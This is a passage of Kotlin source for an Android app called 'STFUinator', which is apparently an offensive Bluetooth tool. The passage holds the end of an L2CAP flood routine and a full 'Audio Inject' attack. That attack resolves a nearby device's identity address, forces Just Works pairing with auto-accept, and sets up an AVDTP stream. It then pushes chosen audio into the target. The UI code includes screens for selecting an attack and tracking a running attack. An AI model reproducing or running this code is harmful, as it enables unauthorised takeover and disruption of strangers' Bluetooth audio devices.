                        FileLogger.d(TAG, "LE Flood: ${packetsSent.get()} packets, ${pps}/sec, ${failures.get()} failures")
                    }
                }

                iteration++
                delay(5)
            }

            FileLogger.i(TAG, "LE L2CAP flood complete. Total packets: ${packetsSent.get()}")

        } finally {
            l2cap.removeListener(listener)
            if (!attackRunning.get()) {
                FileLogger.i(TAG, "Disconnecting LE connection...")
                l2cap.disconnect(handle, 0x13)
            }
        }
    }


    private suspend fun executeAudioInject(device: DiscoveredDevice) {
        val l2cap = l2capManager ?: return
        val avdtp = avdtpManager ?: return
        val codec = sbcCodec ?: return
        val pairing = pairingManager ?: return
        val smp = smpManager

        FileLogger.i(TAG, "Starting Audio Inject attack on ${device.address}")

        val bytes = audioBytes ?: run {
            FileLogger.e(TAG, "No audio file loaded")
            return
        }

        var address = parseAddress(device.address)
        var targetAddress = device.address
        val failures = AtomicInteger(0)
        val startTime = System.currentTimeMillis()



        val isLeRandomAddress = device.addressType != 0 && !device.isBrEdr()

        FileLogger.d(TAG, "Device type: isLeRandom=$isLeRandomAddress, isBrEdr=${device.isBrEdr()}, addressType=${device.addressType}")



        if (isLeRandomAddress && smp != null) {

            val deviceName = device.name
            if (!deviceName.isNullOrEmpty()) {
                val matchingDualMode = scannedDevices.values.find {
                    it.name == deviceName && it.isBrEdr() && it.address != device.address
                }
                if (matchingDualMode != null) {
                    FileLogger.i(TAG, "Found matching DUAL-MODE entry: ${matchingDualMode.address}")
                    FileLogger.i(TAG, "Skipping SMP identity resolution, using BR/EDR address directly")
                    targetAddress = matchingDualMode.address
                    address = parseAddress(targetAddress)
                } else {
                    FileLogger.i(TAG, "Device uses LE random address, attempting to resolve identity address via SMP...")


                    courierStack?.hciManager?.let { hciManager ->
                        try {
                            val cancelCmd = HciCommands.leCreateConnectionCancel()
                            hciManager.sendCommandSync(cancelCmd, 1000)
                            delay(100)
                        } catch (e: Exception) {
                            FileLogger.w(TAG, "Failed to cancel pending LE connections: ${e.message}")
                        }
                    }


                    val identityAddress = resolveIdentityAddressViaSmp(
                        l2cap, smp, device.address, device.addressType, 20000
                    )

                    if (identityAddress != null) {
                        targetAddress = identityAddress
                        address = parseAddress(targetAddress)
                        FileLogger.i(TAG, "Resolved Identity Address: $targetAddress")
                    } else {
                        FileLogger.w(TAG, "SMP identity resolution failed, will try BR/EDR with original address")

                    }
                }
            } else {

                FileLogger.i(TAG, "Device uses LE random address, attempting to resolve identity address via SMP...")

                courierStack?.hciManager?.let { hciManager ->
                    try {
                        val cancelCmd = HciCommands.leCreateConnectionCancel()
                        hciManager.sendCommandSync(cancelCmd, 1000)
                        delay(100)
                    } catch (e: Exception) {
                        FileLogger.w(TAG, "Failed to cancel pending LE connections: ${e.message}")
                    }
                }

                val identityAddress = resolveIdentityAddressViaSmp(
                    l2cap, smp, device.address, device.addressType, 20000
                )

                if (identityAddress != null) {
                    targetAddress = identityAddress
                    address = parseAddress(targetAddress)
                    FileLogger.i(TAG, "Resolved Identity Address: $targetAddress")

                    FileLogger.d(TAG, "Waiting for device to settle before BR/EDR connection...")
                    delay(1000)
                } else {
                    FileLogger.w(TAG, "SMP identity resolution failed, will try BR/EDR with original address")
                }
            }
        }


        FileLogger.i(TAG, "Proceeding with BR/EDR connection for AVDTP to $targetAddress")


        pairing.setDefaultPairingMode(BrEdrPairingMode.JUST_WORKS)
        pairing.setAutoAccept(true)
        pairing.enableSsp()
        delay(300)


        val connectionLatch = java.util.concurrent.CountDownLatch(1)
        var connectionHandle: Int? = null

        val listener = object : IL2capListener {
            override fun onConnectionComplete(connection: AclConnection) {
                if (connection.matchesAddress(address)) {
                    connectionHandle = connection.handle
                    connectionLatch.countDown()
                }
            }
            override fun onDisconnectionComplete(handle: Int, reason: Int) {}
            override fun onChannelOpened(channel: L2capChannel) {}
            override fun onChannelClosed(channel: L2capChannel) {}
            override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
            override fun onConnectionRequest(handle: Int, psm: Int, sourceCid: Int) {}
            override fun onError(message: String) {
                FileLogger.e(TAG, "L2CAP listener error: $message")
                failures.incrementAndGet()
            }
            override fun onMessage(message: String) {}
        }

        l2cap.addListener(listener)


        FileLogger.i(TAG, "Calling createConnection for ${formatAddress(address)}...")
        l2cap.createConnection(address, object : IL2capConnectionCallback {
            override fun onSuccess(channel: L2capChannel) {
                FileLogger.i(TAG, "createConnection callback success, handle=0x${Integer.toHexString(channel.connection.handle)}")
                connectionHandle = channel.connection.handle
                connectionLatch.countDown()
            }
            override fun onFailure(reason: String) {
                FileLogger.e(TAG, "createConnection callback failed: $reason")
                failures.incrementAndGet()
                connectionLatch.countDown()
            }
        })

        val connected = connectionLatch.await(15, java.util.concurrent.TimeUnit.SECONDS)

        if (!connected || connectionHandle == null) {
            FileLogger.e(TAG, "Failed to establish ACL connection (timeout or failure)")
            l2cap.removeListener(listener)
            return
        }

        var handle = connectionHandle!!
        FileLogger.i(TAG, "BR/EDR ACL connection established, handle=0x${Integer.toHexString(handle)}")
        withContext(Dispatchers.Main) { attackStats = attackStats.copy(connections = 1) }


        FileLogger.i(TAG, "Starting BR/EDR pairing...")
        var pairingSucceeded = pairing.pairDeviceSync(address, handle, 30000)

        if (!pairingSucceeded) {
            FileLogger.w(TAG, "First pairing attempt failed, retrying...")
            delay(2000)


            if (l2cap.getConnection(handle) == null) {
                FileLogger.i(TAG, "Reconnecting ACL for retry...")
                val reconnectLatch = java.util.concurrent.CountDownLatch(1)
                var newHandle: Int? = null
                l2cap.createConnection(address, object : IL2capConnectionCallback {
                    override fun onSuccess(channel: L2capChannel) {
                        newHandle = channel.connection.handle
                        reconnectLatch.countDown()
                    }
                    override fun onFailure(reason: String) {
                        reconnectLatch.countDown()
                    }
                })
                reconnectLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
                if (newHandle != null) {
                    handle = newHandle!!
                    connectionHandle = newHandle
                }
            }

            pairingSucceeded = pairing.pairDeviceSync(address, handle, 30000)
        }

        if (!pairingSucceeded) {
            FileLogger.w(TAG, "BR/EDR pairing failed after all attempts")
            FileLogger.w(TAG, "TIP: Put the device in pairing mode (usually long-press power button)")
            FileLogger.i(TAG, "Attempting AVDTP connection anyway (may work if already paired)...")
        }






        FileLogger.i(TAG, "Opening AVDTP signal channel directly via L2CAP...")


        val aclConnection = l2cap.getConnection(handle)
        if (aclConnection == null) {
            FileLogger.e(TAG, "ACL connection lost before AVDTP setup")
            l2cap.removeListener(listener)
            return
        }

        val signalLatch = java.util.concurrent.CountDownLatch(1)
        var signalChannel: L2capChannel? = null

        l2cap.connectChannel(aclConnection, AvdtpConstants.PSM_AVDTP,
            object : IL2capConnectionCallback {
                override fun onSuccess(channel: L2capChannel) {
                    FileLogger.i(TAG, "Signal channel opened: CID=0x${Integer.toHexString(channel.localCid)}")
                    signalChannel = channel
                    signalLatch.countDown()
                }
                override fun onFailure(reason: String) {
                    FileLogger.e(TAG, "Signal channel failed: $reason")
                    signalLatch.countDown()
                }
            })

        if (!signalLatch.await(5, java.util.concurrent.TimeUnit.SECONDS)) {
            FileLogger.e(TAG, "Signal channel timeout")
            l2cap.removeListener(listener)
            return
        }

        if (signalChannel == null) {
            FileLogger.e(TAG, "Signal channel is null")
            l2cap.removeListener(listener)
            return
        }

        val signalingCid = signalChannel!!.localCid
        FileLogger.i(TAG, "AVDTP signal channel ready: CID=0x${Integer.toHexString(signalingCid)}")





        var transactionLabel = 0


        fun sendAvdtpCommand(signalId: Int, params: ByteArray?) {
            val paramLen = params?.size ?: 0
            val packet = ByteArray(2 + paramLen)

            packet[0] = ((transactionLabel shl 4) or 0x00).toByte()
            packet[1] = signalId.toByte()
            if (params != null) {
                System.arraycopy(params, 0, packet, 2, paramLen)
            }
            FileLogger.d(TAG, "Sending AVDTP signal ${signalId}: ${packet.size} bytes")
            l2cap.sendData(signalChannel!!, packet)
            transactionLabel = (transactionLabel + 1) and 0x0F
        }


        FileLogger.i(TAG, "Sending AVDTP DISCOVER...")
        sendAvdtpCommand(0x01, null)
        delay(500)


        FileLogger.i(TAG, "Sending GET_CAPABILITIES for SEID 1...")
        sendAvdtpCommand(0x02, byteArrayOf(0x04))
        delay(500)


        FileLogger.i(TAG, "Sending SET_CONFIGURATION (SBC)...")
        val sbcConfig = byteArrayOf(
            0x04,
            0x04,
            0x01, 0x00,
            0x07, 0x06,
            0x00,
            0x00,
            0x21,
            0x15,
            0x02,
            0x35
        )
        sendAvdtpCommand(0x03, sbcConfig)
        delay(500)


        FileLogger.i(TAG, "Sending AVDTP OPEN...")
        sendAvdtpCommand(0x06, byteArrayOf(0x04))
        delay(500)


        FileLogger.i(TAG, "Opening media transport channel...")
        val mediaLatch = java.util.concurrent.CountDownLatch(1)
        var mediaChannel: L2capChannel? = null


        val mediaAclConnection = l2cap.getConnection(handle)
        if (mediaAclConnection == null) {
            FileLogger.w(TAG, "ACL connection lost, cannot open media channel")
        } else {
            l2cap.connectChannel(mediaAclConnection, AvdtpConstants.PSM_AVDTP,
                object : IL2capConnectionCallback {
                    override fun onSuccess(channel: L2capChannel) {
                        FileLogger.i(TAG, "Media channel opened: CID=0x${Integer.toHexString(channel.localCid)}")
                        mediaChannel = channel
                        mediaLatch.countDown()
                    }
                    override fun onFailure(reason: String) {
                        FileLogger.w(TAG, "Media channel failed: $reason (continuing anyway)")
                        mediaLatch.countDown()
                    }
                })

            mediaLatch.await(3, java.util.concurrent.TimeUnit.SECONDS)
        }
        delay(200)


        FileLogger.i(TAG, "Sending AVDTP START...")
        sendAvdtpCommand(0x07, byteArrayOf(0x04))
        delay(300)

        FileLogger.i(TAG, "AVDTP stream setup complete!")


        val streamChannel: L2capChannel = mediaChannel ?: signalChannel!!
        FileLogger.i(TAG, "Will stream on CID=0x${Integer.toHexString(streamChannel.localCid)}")

        FileLogger.i(TAG, "AVDTP stream started! Sending audio...")


        try {
            val wavInfo = AudioStreamer.parseWav(bytes)
            if (wavInfo == null) {
                FileLogger.e(TAG, "Failed to parse WAV file")
                return
            }

            var pcmData = wavInfo.pcmData


            if (wavInfo.sampleRate != 44100) {
                pcmData = AudioStreamer.resample(pcmData, wavInfo.sampleRate, 44100, wavInfo.channels)
            }


            if (wavInfo.channels == 1) {
                pcmData = AudioStreamer.monoToStereo(pcmData)
            }


            if (audioVolumeGain != 1.0f) {
                pcmData = AudioStreamer.applyGain(pcmData, audioVolumeGain)
            }


            val samplesPerFrame = codec.samplesPerFrame * 2
            val frameSize = codec.encodedFrameSize
            val mtu = 672
            val maxPayload = mtu - 13
            val framesPerPacket = minOf(maxPayload / frameSize, 15)


            val sampleRate = 44100
            val packetDurationMs = (samplesPerFrame / 2) * framesPerPacket * 1000L / sampleRate

            FileLogger.i(TAG, "Streaming config: frameSize=$frameSize framesPerPacket=$framesPerPacket packetDurationMs=$packetDurationMs")
            FileLogger.i(TAG, "PCM data size: ${pcmData.size} samples, duration=${pcmData.size * 1000L / sampleRate / 2}ms")

            var offset = 0
            var bytesSent = 0L
            var framesSent = 0
            var packetsSent = 0
            var sequenceNumber = 0
            var timestamp = 0
            var streamStartTime = System.currentTimeMillis()

            while (attackRunning.get() && offset < pcmData.size) {

                if (attackPausedFlag.get()) {
                    while (attackPausedFlag.get() && attackRunning.get()) { delay(100) }

                    streamStartTime = System.currentTimeMillis() - (packetsSent * packetDurationMs)
                }
                if (!attackRunning.get()) break


                val framesToSend = minOf(framesPerPacket, (pcmData.size - offset) / samplesPerFrame)
                if (framesToSend <= 0) break


                val encodedFrames = ByteArray(framesToSend * frameSize)
                var encodedOffset = 0
                var framesEncoded = 0

                for (i in 0 until framesToSend) {
                    val remaining = pcmData.size - offset
                    if (remaining < samplesPerFrame) break

                    val frame = codec.encode(pcmData, offset, samplesPerFrame)
                    if (frame != null) {
                        System.arraycopy(frame, 0, encodedFrames, encodedOffset, frame.size)
                        encodedOffset += frame.size
                        framesEncoded++
                    }
                    offset += samplesPerFrame
                }

                if (framesEncoded > 0) {

                    val rtpPacket = ByteArray(12 + 1 + encodedOffset)


                    rtpPacket[0] = 0x80.toByte()
                    rtpPacket[1] = 0x60.toByte()
                    rtpPacket[2] = ((sequenceNumber shr 8) and 0xFF).toByte()
                    rtpPacket[3] = (sequenceNumber and 0xFF).toByte()
                    rtpPacket[4] = ((timestamp shr 24) and 0xFF).toByte()
                    rtpPacket[5] = ((timestamp shr 16) and 0xFF).toByte()
                    rtpPacket[6] = ((timestamp shr 8) and 0xFF).toByte()
                    rtpPacket[7] = (timestamp and 0xFF).toByte()
                    rtpPacket[8] = 0x00.toByte()
                    rtpPacket[9] = 0x00.toByte()
                    rtpPacket[10] = 0x00.toByte()
                    rtpPacket[11] = 0x01.toByte()








                    rtpPacket[12] = (0x60 or (framesEncoded and 0x0F)).toByte()


                    System.arraycopy(encodedFrames, 0, rtpPacket, 13, encodedOffset)


                    l2cap.sendData(streamChannel, rtpPacket)


                    sequenceNumber = (sequenceNumber + 1) and 0xFFFF
                    timestamp += (samplesPerFrame / 2) * framesEncoded
                    bytesSent += rtpPacket.size
                    framesSent += framesEncoded
                    packetsSent++


                    if (packetsSent % 100 == 0) {
                        FileLogger.d(TAG, "Streaming: $packetsSent packets, $framesSent frames, $bytesSent bytes sent")
                    }
                }

                val elapsed = ((System.currentTimeMillis() - startTime) / 1000).toInt()
                withContext(Dispatchers.Main) {
                    attackStats = AttackStats(
                        connections = 1,
                        dataSent = bytesSent,
                        failures = failures.get(),
                        elapsed = elapsed
                    )
                }


                val expectedTime = streamStartTime + (packetsSent * packetDurationMs)
                val currentTime = System.currentTimeMillis()
                val sleepTime = expectedTime - currentTime
                if (sleepTime > 0) {
                    delay(sleepTime)
                }
            }

            FileLogger.i(TAG, "Audio streaming complete: $packetsSent packets, $framesSent frames, $bytesSent bytes")
        } catch (e: Exception) {
            FileLogger.e(TAG, "Audio streaming error", e)
        } finally {
            avdtp.close(handle)
            l2cap.removeListener(listener)
        }
    }


    private suspend fun resolveIdentityAddressViaSmp(
        l2cap: L2capManager,
        smp: SmpManager,
        leAddress: String,
        addressType: Int,
        timeoutMs: Long
    ): String? = withContext(Dispatchers.IO) {
        FileLogger.i(TAG, "Resolving Identity Address via LE SMP pairing...")
        FileLogger.d(TAG, "Connecting to LE address: $leAddress (type=$addressType)")

        val address = parseAddress(leAddress)
        var connectionHandle: Int? = null
        val connectionLatch = java.util.concurrent.CountDownLatch(1)


        val l2capListener = object : IL2capListener {
            override fun onConnectionComplete(connection: AclConnection) {
                if (connection.type == ConnectionType.LE) {
                    connectionHandle = connection.handle
                    connectionLatch.countDown()
                    FileLogger.i(TAG, "LE connected, handle=0x${Integer.toHexString(connection.handle)}")
                }
            }
            override fun onDisconnectionComplete(handle: Int, reason: Int) {
                FileLogger.d(TAG, "LE disconnected, reason=0x${Integer.toHexString(reason)}")
            }
            override fun onConnectionRequest(handle: Int, psm: Int, sourceCid: Int) {}
            override fun onChannelOpened(channel: L2capChannel) {}
            override fun onChannelClosed(channel: L2capChannel) {}
            override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
            override fun onError(message: String) {
                FileLogger.e(TAG, "L2CAP error: $message")
                connectionLatch.countDown()
            }
            override fun onMessage(message: String) {}
        }

        l2cap.addListener(l2capListener)

        try {

            l2cap.createLeConnection(address, addressType, IL2capConnectionCallback.create(
                { _ -> },
                { reason ->
                    FileLogger.e(TAG, "LE connection failed: $reason")
                    connectionLatch.countDown()
                }
            ))

            val connected = connectionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            if (!connected || connectionHandle == null) {
                FileLogger.e(TAG, "Failed to establish LE connection for identity resolution")
                return@withContext null
            }

            val handle = connectionHandle!!



            smp.setDefaultAuthReq(
                SmpConstants.AUTH_REQ_BONDING or SmpConstants.AUTH_REQ_MITM
            )


            FileLogger.i(TAG, "Initiating SMP pairing to get Identity Address...")
            val pairingSuccess = smp.initiatePairingSync(handle, address, addressType, timeoutMs)


            delay(500)


            val identityAddr = smp.getIdentityAddress(handle)
            val identityType = smp.getIdentityAddressType(handle)


            FileLogger.d(TAG, "Disconnecting LE connection (handle=0x${Integer.toHexString(handle)})...")
            val disconnectLatch = java.util.concurrent.CountDownLatch(1)
            val disconnectListener = object : IL2capListener {
                override fun onDisconnectionComplete(h: Int, reason: Int) {
                    if (h == handle) {
                        FileLogger.d(TAG, "LE disconnect completed, reason=0x${Integer.toHexString(reason)}")
                        disconnectLatch.countDown()
                    }
                }
                override fun onConnectionComplete(connection: AclConnection) {}
                override fun onChannelOpened(channel: L2capChannel) {}
                override fun onChannelClosed(channel: L2capChannel) {}
                override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
                override fun onConnectionRequest(handle: Int, psm: Int, sourceCid: Int) {}
                override fun onError(message: String) {}
                override fun onMessage(message: String) {}
            }
            l2cap.addListener(disconnectListener)
            l2cap.disconnect(handle, 0x13)


            val disconnected = disconnectLatch.await(3, java.util.concurrent.TimeUnit.SECONDS)
            l2cap.removeListener(disconnectListener)

            if (!disconnected) {
                FileLogger.w(TAG, "LE disconnect timed out, proceeding anyway")
            }


            delay(500)

            if (identityAddr != null && identityType == 0) {
                val realAddr = formatAddress(identityAddr)
                FileLogger.i(TAG, "Successfully resolved Identity Address: $realAddr")
                return@withContext realAddr
            } else if (identityAddr != null) {
                FileLogger.w(TAG, "Got Identity Address but type=$identityType (need type=0 for BR/EDR)")
            } else {
                FileLogger.w(TAG, "Device did not send Identity Address (pairing=$pairingSuccess)")
                FileLogger.w(TAG, "Device may not support Identity Address distribution")
            }

            return@withContext null

        } finally {
            l2cap.removeListener(l2capListener)
        }
    }


    private fun getFileName(uri: Uri): String {
        var name = "Unknown"
        contentResolver.query(uri, null, null, null, null)?.use { cursor ->
            val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
            if (cursor.moveToFirst() && nameIndex >= 0) {
                name = cursor.getString(nameIndex)
            }
        }
        return name
    }

    private fun loadAudioFile(uri: Uri) {
        try {
            contentResolver.openInputStream(uri)?.use { inputStream ->
                audioBytes = inputStream.readBytes()
                FileLogger.i(TAG, "Loaded audio file: ${selectedAudioName}, ${audioBytes?.size ?: 0} bytes")
            }
        } catch (e: Exception) {
            FileLogger.e(TAG, "Failed to load audio file", e)
            audioBytes = null
        }
    }

    private fun pickAudioFile(device: DiscoveredDevice) {
        pendingAudioAttackDevice = device
        audioPickerLauncher.launch("audio/*")
    }

    private fun launchAudioAttack(device: DiscoveredDevice) {
        FileLogger.i(TAG, "Starting audio attack with volume gain: ${audioVolumeGain}x")
        stopScan()
        attackTarget = device
        attackMethod = AttackMethod.METHOD_5
        attackStats = AttackStats()
        isAttacking = true
        attackPaused = false
        attackRunning.set(true)
        attackPausedFlag.set(false)

        attackJob = CoroutineScope(Dispatchers.IO).launch {
            executeAudioInject(device)
            withContext(Dispatchers.Main) {
                isAttacking = false
                attackTarget = null
                attackMethod = null
            }
        }
    }

    // ==================== Utility Functions ====================
    private fun parseAddress(address: String): ByteArray {
        val parts = address.split(":")
        val bytes = ByteArray(6)
        for (i in 0 until 6) {
            bytes[5 - i] = Integer.parseInt(parts[i], 16).toByte()
        }
        return bytes
    }

    private fun formatAddress(addr: ByteArray): String {
        return String.format("%02X:%02X:%02X:%02X:%02X:%02X",
            addr[5].toInt() and 0xFF, addr[4].toInt() and 0xFF, addr[3].toInt() and 0xFF,
            addr[2].toInt() and 0xFF, addr[1].toInt() and 0xFF, addr[0].toInt() and 0xFF)
    }
}

// ==================== THEME ====================
@Composable
fun STFUinatorTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = NeonGreen,
            secondary = NeonGreen,
            background = Color(0xFF0A0F0A),
            surface = SurfaceGreen,
            onPrimary = Color.Black,
            onSecondary = Color.Black,
            onBackground = Color.White,
            onSurface = Color.White
        ),
        content = content
    )
}

// ==================== MAIN APP COMPOSABLE ====================
@Composable
fun STFUinatorApp(
    initState: CourierStackManager.State,
    statusMessages: List<String>,
    stackInitialized: Boolean,
    scannedDevices: List<DiscoveredDevice>,
    isScanning: Boolean,
    hasPermissions: Boolean,
    isAttacking: Boolean,
    attackPaused: Boolean,
    attackTarget: DiscoveredDevice?,
    attackMethod: AttackMethod?,
    attackStats: AttackStats,
    selectedAudioName: String?,
    showVolumeDialog: Boolean,
    audioVolumeGain: Float,
    onInitStack: () -> Unit,
    onRequestPermissions: () -> Unit,
    onStartScan: () -> Unit,
    onStopScan: () -> Unit,
    onDeviceClick: (DiscoveredDevice, AttackMethod) -> Unit,
    onPauseAttack: () -> Unit,
    onResumeAttack: () -> Unit,
    onStopAttack: () -> Unit,
    onDismissVolumeDialog: () -> Unit,
    onConfirmVolumeDialog: (Float) -> Unit
) {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(GreenGradient)
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp)
        ) {
            // Header
            Text(
                text = "STFUinator",
                fontSize = 32.sp,
                fontWeight = FontWeight.Bold,
                color = NeonGreen,
                modifier = Modifier.padding(vertical = 16.dp)
            )

            when {
                !hasPermissions -> {
                    // Permission request screen
                    PermissionScreen(onRequestPermissions)
                }
                !stackInitialized -> {
                    // Initialization screen
                    InitializationScreen(initState, statusMessages, onInitStack)
                }
                isAttacking -> {
                    // Attack screen
                    AttackScreen(
                        target = attackTarget,
                        method = attackMethod,
                        stats = attackStats,
                        isPaused = attackPaused,
                        selectedAudioName = selectedAudioName,
                        onPause = onPauseAttack,
                        onResume = onResumeAttack,
                        onStop = onStopAttack
                    )
                }
                else -> {
                    // Main scanning/device list screen
                    MainScreen(
                        devices = scannedDevices,
                        isScanning = isScanning,
                        onStartScan = onStartScan,
                        onStopScan = onStopScan,
                        onDeviceClick = onDeviceClick
                    )
                }
            }
        }

        // Volume dialog
        if (showVolumeDialog) {
            VolumeDialog(
                currentGain = audioVolumeGain,
                onDismiss = onDismissVolumeDialog,
                onConfirm = onConfirmVolumeDialog
            )
        }
    }
}

// ==================== SCREEN COMPOSABLES ====================
@Composable
fun PermissionScreen(onRequestPermissions: () -> Unit) {
    Column(
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            imageVector = Icons.Filled.Lock,
            contentDescription = null,
            tint = NeonGreen,
            modifier = Modifier.size(64.dp)
        )
        Spacer(modifier = Modifier.height(16.dp))
        Text("Permissions Required", color = Color.White, fontSize = 20.sp)
        Spacer(modifier = Modifier.height(24.dp))
        Button(
            onClick = onRequestPermissions,
            colors = ButtonDefaults.buttonColors(containerColor = NeonGreen)
        ) {
            Text("Grant Permissions", color = Color.Black)
        }
    }
}

@Composable
fun InitializationScreen(
    state: CourierStackManager.State,
    messages: List<String>,
    onInit: () -> Unit
) {
    Column(
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.height(32.dp))

        when (state) {
            CourierStackManager.State.UNINITIALIZED -> {
                Button(
                    onClick = onInit,
                    colors = ButtonDefaults.buttonColors(containerColor = NeonGreen)
                ) {
                    Text("Initialize HCI Stack", color = Color.Black, fontWeight = FontWeight.Bold)
                }
            }
            CourierStackManager.State.INITIALIZING -> {
                CircularProgressIndicator(color = NeonGreen)
                Spacer(modifier = Modifier.height(16.dp))
                Text("Initializing...", color = Color.White)
            }
            CourierStackManager.State.ERROR -> {
                Icon(Icons.Filled.Warning, contentDescription = null, tint = NeonRed, modifier = Modifier.size(48.dp))
                Spacer(modifier = Modifier.height(16.dp))
                Text("Initialization Failed", color = NeonRed)
                Spacer(modifier = Modifier.height(16.dp))
                Button(onClick = onInit, colors = ButtonDefaults.buttonColors(containerColor = NeonOrange)) {
                    Text("Retry", color = Color.Black)
                }
            }
            else -> {}
        }

        Spacer(modifier = Modifier.height(24.dp))

        LazyColumn(modifier = Modifier.fillMaxWidth()) {
            items(messages) { message ->
                Text(
                    text = message,
                    color = when {
                        message.startsWith("Error") -> NeonRed
                        message.contains("ready", ignoreCase = true) -> NeonGreen
                        else -> Color.White.copy(alpha = 0.7f)
                    },
                    fontSize = 12.sp,
                    modifier = Modifier.padding(vertical = 2.dp)
                )
            }
        }
    }
}

@Composable
fun MainScreen(
    devices: List<DiscoveredDevice>,
    isScanning: Boolean,
    onStartScan: () -> Unit,
    onStopScan: () -> Unit,
    onDeviceClick: (DiscoveredDevice, AttackMethod) -> Unit
) {
    var selectedDevice by remember { mutableStateOf<DiscoveredDevice?>(null) }

    Column(modifier = Modifier.fillMaxSize()) {
        // Scan controls
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Devices (${devices.size})", color = Color.White, fontSize = 18.sp)

            Button(
                onClick = { if (isScanning) onStopScan() else onStartScan() },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isScanning) NeonOrange else NeonGreen
                )
            ) {
                if (isScanning) {
                    PulsingDot()
                }
                Text(if (isScanning) "Stop" else "Scan", color = Color.Black)
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Device list
        LazyColumn(modifier = Modifier.weight(1f)) {
            items(devices.sortedByDescending { it.rssi }) { device ->
                DeviceCard(
                    device = device,
                    onClick = { selectedDevice = device }
                )
            }
        }
    }

    // Attack method dialog
    selectedDevice?.let { device ->
        AttackMethodDialog(
            device = device,
            onDismiss = { selectedDevice = null },
            onMethodSelected = { method ->
                selectedDevice = null
                onDeviceClick(device, method)
            }
        )
    }
}

@Composable
fun DeviceCard(device: DiscoveredDevice, onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp)
            .clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = CardBackground)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = device.displayName,
                    color = Color.White,
                    fontWeight = FontWeight.Bold,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
                Text(
                    text = device.address,
                    color = Color.White.copy(alpha = 0.6f),
                    fontSize = 12.sp
                )
            }

            Column(horizontalAlignment = Alignment.End) {
                Text(
                    text = "${device.rssi} dBm",
                    color = when {
                        device.rssi > -50 -> NeonGreen
                        device.rssi > -70 -> NeonOrange
                        else -> NeonRed
                    },
                    fontSize = 12.sp
                )
                // Show device type based on advertising data detection
                val typeText = when {
                    device.isDualMode() -> "Dual"      // Both LE and BR/EDR confirmed
                    device.supportsBrEdr() -> "Dual*"  // BR/EDR capability from AD flags
                    device.addressType == 0 -> "LE Pub" // LE with public address
                    else -> "LE Rnd"                    // LE with random address
                }
                val typeColor = when {
                    device.isDualMode() || device.supportsBrEdr() -> NeonGreen
                    device.addressType == 0 -> NeonBlue
                    else -> NeonOrange
                }
                Text(
                    text = typeText,
                    color = typeColor,
                    fontSize = 10.sp,
                    fontWeight = FontWeight.Medium
                )
            }
        }
    }
}

@Composable
fun AttackMethodDialog(
    device: DiscoveredDevice,
    onDismiss: () -> Unit,
    onMethodSelected: (AttackMethod) -> Unit
) {
    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(usePlatformDefaultWidth = false)
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth(0.9f)
                .padding(16.dp),
            colors = CardDefaults.cardColors(containerColor = SurfaceGreen)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "Select Attack",
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    color = NeonGreen
                )
                Text(
                    text = device.displayName,
                    color = Color.White.copy(alpha = 0.7f),
                    fontSize = 14.sp
                )

                Spacer(modifier = Modifier.height(16.dp))

                AttackMethod.values().forEach { method ->
                    Button(
                        onClick = { onMethodSelected(method) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(method.color).copy(alpha = 0.3f)
                        )
                    ) {
                        Column(modifier = Modifier.fillMaxWidth()) {
                            Text(method.title, fontWeight = FontWeight.Bold, color = Color(method.color))
                            Text(method.description, fontSize = 11.sp, color = Color.White.copy(alpha = 0.7f))
                        }
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                TextButton(onClick = onDismiss, modifier = Modifier.align(Alignment.End)) {
                    Text("Cancel", color = Color.White)
                }
            }
        }
    }
}

@Composable
fun AttackScreen(
    target: DiscoveredDevice?,
    method: AttackMethod?,
    stats: AttackStats,
    isPaused: Boolean,
    selectedAudioName: String?,
    onPause: () -> Unit,
    onResume: () -> Unit,
    onStop: () -> Unit
) {
    Column(
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        // Target info
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = CardBackground)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("Target", color = Color.White.copy(alpha = 0.7f), fontSize = 12.sp)
                Text(target?.displayName ?: "Unknown", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                Text(target?.address ?: "", color = Color.White.copy(alpha = 0.6f), fontSize = 12.sp)
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Attack method
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(method?.color ?: 0xFF000000).copy(alpha = 0.2f))
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                if (!isPaused) {
                    PulsingDot()
                }
                Column {
